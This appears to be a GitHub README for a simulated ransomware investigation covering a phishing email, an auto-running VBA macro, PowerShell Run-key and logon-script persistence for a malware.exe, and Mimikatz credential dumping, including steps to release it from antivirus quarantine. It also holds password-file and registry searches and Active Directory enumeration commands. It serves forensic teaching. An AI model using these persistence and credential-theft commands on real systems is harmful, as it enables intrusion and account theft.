# Evidence Artefacts

## Overview

This document catalogues the forensic evidence collected and analysed during the investigation at each phase of the Ransomware as deemed necessary. It will include both sides of the attack, from the forensic examiner's and the attacker's points of view, to establish a complete simulation of what occurs during this attack.

## Digital Evidence

### 1. Email and VBA macros

#### Artefacts Collected

- Original Email Message
  - Evidence highlights the social engineering tactics used on the sender. The sender is not from the official security email address that many companies would have. There is a threat within the text of account termination, creating fear and a deadline for the user to act upon. There is also a grammatical error ("WIng"). This is a common feature within most phishing scams.

<img width="3840" height="2160" alt="email" src="https://github.com/user-attachments/assets/4f77841c-7003-4339-860a-a44b675ded80" />


- Attachment Files
  - The image below shows a message box that appeared upon opening the document, alerting the user to the attack. In an unsimulated circumstance, this would not appear; instead, it would run malicious code in the background.

<img width="3840" height="2160" alt="initalattack" src="https://github.com/user-attachments/assets/811ebd7f-3380-4f8f-9371-e893405725f1" />

- Obfuscated Code
   - Below shows another output that was automatic upon opening the document. This was an obfuscated string that would be untraceable and unreadable. In real-world scenarios, after being translated, there would not be a pop-up; instead, it would give the malicious actor access to the secured network.

<img width="3840" height="2160" alt="malware" src="https://github.com/user-attachments/assets/2f76c252-deae-47cb-9c58-c651da4152a9" />

#### VBA Code
```
Option Explicit 'catches logical errors

Function Base64Decode(base64string As String) As String 'function to decode obfuscated code
    Dim xmlObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument.6.0") 'calls library
    Dim node As Object
    Set node = xmlObj.createElement("tmp") 'extracts the object
    node.DataType = "bin.base64"
    node.Text = base64string
    Dim byteData() As Byte
    byteData = node.nodeTypedValue 'changes data type to byte
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2 'adTypeText
    stream.Mode = 3 'adModeReadWrite
    stream.Open
    stream.WriteText StrConv(byteData, vbUnicode) 'converts bytes to unicode
    stream.Position = 0 'starts at the beginning
    stream.Type = 2
    Base64Decode = stream.ReadText 'returns decoded string to procedure
    stream.Close
    
End Function

Sub Document_Open() 'procedure will run once document is opened
    MsgBox "This file contained malcious code. Your files are now under attack!", vbExclamation, "RANSOMWARE" 'opens a message box alerting user that the code has run
    
    Dim encoded As String
    encoded = "bWFsd2FyZQ==" '"malware" after being obfuscated in base64
    Dim decoded As String
    decoded = Base64Decode(encoded) 'calls to function
    
    MsgBox decoded
End Sub
```
### 2. System Artifacts

#### Registry Evidence

- Run Key:
  - Upon a user logging on, the malware.exe will be initiated. This will allow any processes that may have been terminated from the computer shutdown to restart. Allows for persistence in the attack and disguises itself among official Windows tools. Below is the PowerShell code:

```
$MalwarePath = "C:\Users\Public\malware.exe" #defines where the malware is stored
$RegPath = "HKCU: \Software\Microsoft\Windows\CurrentVersion\Run" #directs to the registry key
$Name = "Updater" #name of the new registry key
Set-ItemProperty -Path $RegPath -Name $Name -Value $MalwarePath
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"/v Updater /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates the new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof of new registry key in registry editor" src="https://github.com/user-attachments/assets/3fd623a1-55e2-4255-9538-32e1f03c3a1a" />

- Logoff Key:
   - Although there is no standard key for logging off, an attacker can still manipulate the environment keys, which may not take effect until after a logoff or a restart of the session. Keys in the environment will be wiped after the session ends, but having a script that runs upon logging off can inject the malicious key once again, removing its volatility. Below is the PowerShell code to add a 'logoff' key:

```
$LogoffScript = "C:\Users\Public\malware.exe" #defines where the malware is located
Set-ItemProperty —Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $LogoffScript
reg add "HKCU\Software\Microsoft\CurrentVersion\Logoff" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof for logoff key" src="https://github.com/user-attachments/assets/e41192b9-4fb3-4b35-a19a-a79f37f7c01b" />

- Trap:
   - To ensure total persistence is achieved, the malware must be able to handle unexpected crashes and shutdowns. Below is the code that would restart the process upon meeting an unexpected situation using the Trap procedure:

```
trap #begins when an error is detected
{ Start-Process "C:\Users\Public\malware exe" #starts malware.exe process again
Continue } #continues to the next statement after the error
```

### 3. Credentials

#### LSASS Dumping

- Task Manager was used for the creation of this dump.
   - First, open the manager.
   - Then select a process you want to dump; in this case, Application Data was chosen.
   - Right-click the process and select Create Dump File.
   - A dialogue box will appear to showcase the dump, which can be viewed through an application such as Visual Studio (see below:).
 
<img width="3840" height="2160" alt="lss dump" src="https://github.com/user-attachments/assets/bc01f94e-c9f8-430c-9cda-87968d89f973" />

This dump showcases all of the modules on the system, their versions, and storage paths, allowing malicious users to understand the configuration of the system and slip malware into places that are not accessed regularly. 

#### Mimikatz

This application was downloaded from: https://github.com/ParrotSec/mimikatz/tree/master.

[Note: when downloading it, the system's security will flag the file as a virus and once run, it will be terminated and put into quarantine. Go to Virus & Threat Protection, the history where a list of quarantined items is available. You can then manually release the file to allow it to run. For a black-hat hacker to run this without this issue, they would use the obfuscation techniques as demonstrated in the previous phases.]

1. Password Extraction:

- Before any passwords can be harvested, the user's privileges are raised. This is done through raising their role to debug, giving them access to interact with other processes, no matter what level they are.

```
privilege::debug
```

  Output:

<img width="702" height="56" alt="image" src="https://github.com/user-attachments/assets/d17fa026-0820-4f5a-918b-07b40eda7a21" />

- After this is completed, a token with high-level access is impersonated, allowing for sensitive tasks to be completed.

```
token::elevate
```

  Output:

<img width="3714" height="571" alt="image" src="https://github.com/user-attachments/assets/5bb78e68-87e3-45bf-a7fc-4b0865e71b6c" />

- Now the passwords can be dumped using 'sekurlsa', which interacts with the LSASS to extract this information.

```
serkurlsa::logonpasswords
```

  Output: P@ssw0rd!

  (The short list is due to the simulation system having only one user. For a wider network in the real   world, the list would be longer, with much more exploitation possible.) 

2. SAM Dump:

- The Security Account Manager (SAM) is a database storing all of the usernames and password hashes for local accounts on a machine. Its legitimate purpose is to authenticate users who are logging onto the device. By using Mimikatz, this information can be used to obtain further privileged access to the system.

```
lsadump:sam
```

  Output:

<img width="3840" height="2160" alt="sam" src="https://github.com/user-attachments/assets/28adc5e4-8293-46b5-b353-ee8d848e0ccd" />

3. Location Finder:

- The command prompt can be used to search for files that contain strings, such as 'password', in their names, leading malicious actors to possible locations of credentials.

```
findstr /si password *.txt
findstr /si password *.xml *.ini *.txt #searches for files ending with .xml/.ini/.txt that contain 'password' in their name throughout all files on the system
```

<img width="3840" height="2160" alt="all partition files that conatin password" src="https://github.com/user-attachments/assets/4361ac6c-bfc4-41a8-959e-005630617db5" />

- Instead of just files, the directories, their corresponding files, and the date and time of creation can be found through the code below:

```
dir /s *pass* == *cred* == *vnc* == *.config* #searches through directories for files containing 'pass'/'cred'/'vnc' in its name
```

- This allows for malicious users to find the newest credentials that will be more useful for them than the older, potentially out-of-date information.

  Output: 

<img width="3840" height="2160" alt="location and password txt list" src="https://github.com/user-attachments/assets/d96a28c5-bf17-4e36-8386-75e21f25af48" />

4. Registry:

- In previous steps, the registry has been manipulated using the command prompt. However, in this case, it can be used to search for registry keys that store passwords for further credential access.

```
reg query HKLM /f password /t REG_SZ /s #searches top-level registry hive for entries that contain 'password', including subkeys
```

  Output: 

<img width="3840" height="2160" alt="registry passwords" src="https://github.com/user-attachments/assets/3098cd73-6c5d-44fe-8314-2c54a5304424" />


### 4. Network Discovery and Lateral Movement

[ad query code for later: Get-ADUser -Filter * -Properties * | Select-Object Name, SamAccountName, EmailAddress NEXT CODE LINE Get-ADGroup -Filter * | Select-Object Name, SamAccountName NEXT CODE LINE Get-ADComputer -Filter * | Select-Object Name, DNSHostName, OperatingSystem]
